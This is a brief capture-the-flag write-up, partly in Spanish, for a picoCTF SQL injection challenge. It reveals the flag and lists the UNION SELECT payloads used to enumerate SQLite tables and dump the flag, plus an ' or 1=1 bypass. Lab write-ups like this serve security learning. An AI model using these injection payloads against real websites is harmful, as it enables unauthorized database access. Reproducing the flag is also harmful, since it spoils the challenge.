## More SQLi
## Descripción
Can you find the flag on this website.

Additional details will be available after launching your challenge instance.
## Solución
al momento de entrar con la ultima nota, la penultima es asignada a su buscador de la pagina y asi nos da la bandera.
picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_e3e46aae}

## Notas
ciudad' union select 1,2,3; 
ciudad' union select sqlite_version(),2,3; 
ciudad' union select 1,2,tbl_name FROM sqlite_master WHERE type='table' ; 
ciudad' union select 1,sql,tbl_name FROM sqlite_master WHERE type='table' ; 
ciudad' union select 1,2,flag from more_table;
 ' or 1=1;
## Referencias